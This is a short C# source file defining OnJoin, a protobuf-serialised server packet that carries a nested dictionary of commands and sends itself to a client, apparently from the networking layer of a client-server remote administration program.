using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class OnJoin : IPacket
    {
        [ProtoMember(1)]
        public Dictionary<int, Dictionary<string, string>> Commands { get; private set; }

        public OnJoin()
        {
        }

        public OnJoin(Dictionary<int, Dictionary<string, string>> commands)
        {
            this.Commands = commands;
        }

        public void Execute(Client client)
        {
            client.Send<OnJoin>(this);
        }
    }
}
